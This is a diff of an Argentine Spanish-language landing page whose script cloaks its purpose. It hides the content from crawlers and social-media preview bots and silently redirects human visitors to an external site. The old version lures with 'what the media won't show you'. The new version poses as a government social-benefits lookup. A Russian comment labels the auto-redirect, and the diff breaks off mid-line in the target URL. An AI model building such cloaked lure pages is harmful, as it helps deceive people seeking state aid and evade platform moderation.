@@ -3,16 +3,16 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Argentina Hoy</title>
-  <meta property="og:title" content="Información exclusiva para argentinos">
-  <meta property="og:description" content="Acceso limitado para ciudadanos locales">
+  <title>Consulta de beneficios sociales</title>
+  <meta property="og:title" content="Consulta de beneficios en Argentina">
+  <meta property="og:description" content="Información pública para ciudadanos argentinos">
   <meta property="og:image" content="background.jpg">
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; }
     html, body {
       height: 100%;
       font-family: 'Segoe UI', sans-serif;
-      background: linear-gradient(rgba(0,0,0,0.4), rgba(0,0,0,0.4)), url('background.jpg') no-repeat center center/cover;
+      background: linear-gradient(rgba(0,0,0,0.5), rgba(0,0,0,0.5)), url('background.jpg') no-repeat center center/cover;
       display: flex;
       align-items: center;
       justify-content: center;
@@ -22,7 +22,7 @@
     }
     h1 {
       color: white;
-      font-size: 2.3em;
+      font-size: 2.2em;
       text-shadow: 2px 2px 5px rgba(0,0,0,0.5);
       margin-bottom: 15px;
     }
@@ -53,42 +53,14 @@
   </style>
 </head>
 <body>
-  <h1>Descubrí lo que no muestran los medios</h1>
-  <p>Acceso limitado a información verificada. Disponible sólo por tiempo limitado.</p>
-  <button class="btn" id="accederBtn">Continuar</button>
+  <h1>Consulta de beneficios sociales</h1>
+  <p>Verificá si tenés acceso a nuevos programas estatales disponibles.</p>
+  <button class="btn" id="accederBtn">Consultar ahora</button>
 
   <script>
-    const isBot = () => {
-      const ua = navigator.userAgent.toLowerCase();
-      return navigator.webdriver ||
-        !navigator.plugins.length ||
-        !navigator.languages ||
-        /bot|crawl|spider|facebookexternalhit|headless|phantomjs/.test(ua);
-    };
+    const isSuspicious = () => navigator.webdriver;
 
-    let clicked = false;
-    const targetURL = "https://argentinaforreal.tilda.ws/";
-
-    document.getElementById("accederBtn").addEventListener("click", () => {
-      if (!clicked && !isBot()) {
-        clicked = true;
-        window.location.replace(targetURL);
-      }
-    });
-
-    // Авто-редирект если человек и не кликнул
-    setTimeout(() => {
-      if (!clicked && !isBot()) {
-        window.location.replace(targetURL);
-      }
-    }, 3500);
-
-    if (isBot()) {
-      document.body.innerHTML = "<h1 style='color:white;text-shadow:1px 1px 4px black'>Acceso restringido</h1>";
-    }
-  </script>
-</body>
-</html>
+    const targetURL = "h
 
 
 
